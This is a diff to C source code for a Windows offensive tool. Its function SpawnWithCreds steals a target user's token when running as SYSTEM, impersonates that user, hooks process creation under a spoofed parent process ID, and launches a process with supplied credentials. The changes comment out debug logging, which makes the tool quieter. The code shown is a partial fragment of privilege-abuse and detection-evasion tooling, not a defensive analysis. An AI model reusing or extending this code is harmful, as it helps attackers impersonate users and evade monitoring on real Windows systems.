@@ -39,9 +39,9 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
                            LPCSTR stealTarget, LPCSTR ppidName,
                            DWORD sleepMs) {
 
-    DBG_SEPARATOR();
-    DBG_INFO("SpawnWithCreds -> %s\\%s  cmd: %s", domain, user, cmdline);
-    DBG_SEPARATOR();
+    // DBG_SEPARATOR();
+    // DBG_INFO("SpawnWithCreds -> %s\\%s  cmd: %s", domain, user, cmdline);
+    // DBG_SEPARATOR();
 
     PROCESS_INFORMATION pi = {0};
     BOOL result = FALSE;
@@ -51,7 +51,7 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
     // -------------------------------------------------------------------------
     if (!_IsSystem()) {
         DBG_INFO("non-SYSTEM -> CreateProcessWithLogonW");
-        DBG_SEPARATOR();
+        // DBG_SEPARATOR();
 
         // HANDLE hSelf = NULL;
         // if (OpenProcessToken(GetCurrentProcess(),
@@ -95,7 +95,7 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
     // SYSTEM -> steal token -> impersonate -> hook -> CPWLW
     // -------------------------------------------------------------------------
     DBG_INFO("SYSTEM -> steal token -> impersonate -> hook -> CreateProcessWithLogonW");
-    DBG_SEPARATOR();
+    // DBG_SEPARATOR();
 
     if (!stealTarget || !stealTarget[0]) {
         DBG_ERR("requires -t <target_user>");
@@ -131,7 +131,7 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
     CloseHandle(hStolen);
     // DumpTokenInfo(hImp, "Duplicated impersonation token");
 
-    // [4] impersonate -> thread runs as stealTarget, process still SYSTEM
+    // impersonate -> thread runs as stealTarget, process still SYSTEM
     if (!ImpersonateLoggedOnUser(hImp)) {
         DBG_ERR("ImpersonateLoggedOnUser failed: 0x%08lX", GetLastError());
         CloseHandle(hImp); return FALSE;
@@ -173,8 +173,8 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
     BOOL hookOk = HookInstall(spoofPid);
     if (!hookOk)
         DBG_WARN("HookInstall failed -> expect 0x5");
-    else
-        DBG_OK("hook installed");
+    // else
+    //     DBG_OK("hook installed");
 
     // optional sleep for debugger attach
     if (sleepMs > 0) {
@@ -184,7 +184,7 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
         DBG_INFO(">>> sleep done, calling now <<<");
     }
 
-    // [5d] wide string setup
+    // wide string setup
     WCHAR wUser[256]={0}, wDomain[256]={0}, wPass[256]={0}, wCmd[512]={0};
     MultiByteToWideChar(CP_ACP,0,user,    -1,wUser,  256);
     MultiByteToWideChar(CP_ACP,0,domain,  -1,wDomain,256);
@@ -203,7 +203,7 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
     DWORD lastErr = GetLastError();
 
     // remove hook immediately
-    if (hookOk) { HookRemove(); DBG_INFO("hook removed"); }
+    if (hookOk) { HookRemove();}
 
     // revert to SYSTEM
     RevertToSelf();
